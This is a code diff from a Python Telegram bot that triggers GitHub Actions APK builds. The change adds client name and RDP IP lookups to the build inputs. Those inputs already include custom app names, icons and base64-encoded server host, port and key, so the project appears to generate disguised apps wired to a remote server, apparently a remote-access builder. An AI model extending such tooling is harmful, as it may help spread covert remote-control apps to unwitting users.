@@ -1899,7 +1899,9 @@ def trigger_github_build(template: str, client_id: int,
                          custom_icon_file_id: str = "",
                          server_host_b64: str = "",
                          server_port_b64: str = "",
-                         server_key_b64: str = "") -> bool:
+                         server_key_b64: str = "",
+                         client_name: str = "",
+                         client_ip: str = "") -> bool:
     url     = (
         f"https://api.github.com/repos/"
         f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
@@ -1915,6 +1917,8 @@ def trigger_github_build(template: str, client_id: int,
         "client_id":        str(client_id),
         "build_chat_id":    str(chat_id),
         "build_message_id": str(message_id),
+        "client_name":      client_name,
+        "client_ip":        client_ip,
     }
     if custom_app_name:
         inputs["custom_app_name"] = custom_app_name
@@ -3250,6 +3254,16 @@ def handle_callback(call):
             "━━━━━━━━━━━━━━━━━━━━\n"
             "⏱ Starting..."
         )
+        # Lookup client name + IP for APK filename
+        _db = get_db()
+        _cl = _db.execute(
+            "SELECT profile_name, telegram_username, rdp_ip FROM clients WHERE id=?",
+            (client_id,)
+        ).fetchone()
+        _db.close()
+        _client_name = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
+        _client_ip   = _cl["rdp_ip"] if _cl else ""
+
         ok = trigger_github_build(
             template=template,
             client_id=client_id,
@@ -3260,6 +3274,8 @@ def handle_callback(call):
             server_host_b64=srv_host_b64,
             server_port_b64=srv_port_b64,
             server_key_b64=srv_key_b64,
+            client_name=_client_name,
+            client_ip=_client_ip,
         )
         if ok:
             db = get_db()
